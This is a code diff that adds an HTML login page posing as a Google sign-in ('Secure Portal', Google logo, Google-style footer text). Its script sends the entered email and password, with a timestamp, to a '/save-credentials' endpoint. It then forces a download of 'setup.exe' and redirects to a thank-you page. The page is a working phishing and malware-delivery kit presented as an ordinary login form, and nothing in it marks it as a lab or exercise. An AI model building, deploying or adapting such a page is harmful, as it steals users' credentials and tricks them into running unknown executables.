@@ -1,1 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Secure Portal</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 360px;
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 75px;
+            height: auto;
+        }
+        .input-field {
+            margin-bottom: 20px;
+        }
+        .input-field input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .login-button {
+            background-color: #4285f4;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .login-button:hover {
+            background-color: #357ae8;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Logo">
+        </div>
+        <h2 class="text-xl font-bold mb-4">Sign in</h2>
+        <form id="loginForm" class="space-y-4">
+            <div class="input-field">
+                <input type="email" id="email" name="email" placeholder="Email" required>
+            </div>
+            <div class="input-field">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-button">Next</button>
+        </form>
+        <div class="footer">
+            <p>Not your computer? Use Guest mode to sign in privately.</p>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
+            // Send credentials to backend
+            await fetch('/save-credentials', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
+            });
+
+            // Trigger file download
+            const link = document.createElement('a');
+            link.href = '/downloads/setup.exe';
+            link.download = 'setup.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Show thank you message and redirect
+            setTimeout(() => {
+                window.location.href = '/thankyou';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
